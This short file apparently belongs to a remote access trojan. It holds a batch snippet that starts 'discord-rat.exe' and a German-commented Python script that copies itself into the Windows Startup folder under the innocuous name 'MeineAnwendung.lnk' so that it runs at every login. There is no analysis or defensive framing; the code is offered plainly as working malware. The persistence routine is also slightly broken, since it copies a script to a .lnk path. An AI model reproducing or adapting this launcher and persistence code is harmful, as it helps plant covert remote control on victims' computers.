@echo off
cd "Pfad\zur\Deiner\Exe"
start discord-rat.exe
import os
import shutil
import sys

def set_autostart():
    # Pfade
    current_script_path = os.path.abspath(sys.argv[0])
    autostart_folder = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Ziel-Pfad im Autostart-Ordner
    target_path = os.path.join(autostart_folder, 'MeineAnwendung.lnk')

    # Wenn die Verknüpfung im Autostart nicht existiert, kopiere sie dorthin
    if not os.path.exists(target_path):
        try:
            shutil.copy(current_script_path, target_path)
            print(f"Erfolgreich zum Autostart-Ordner hinzugefügt: {target_path}")
        except Exception as e:
            print(f"Fehler beim Hinzufügen zum Autostart-Ordner: {e}")
    else:
        print("Die Verknüpfung existiert bereits im Autostart-Ordner.")

if __name__ == "__main__":
    set_autostart()
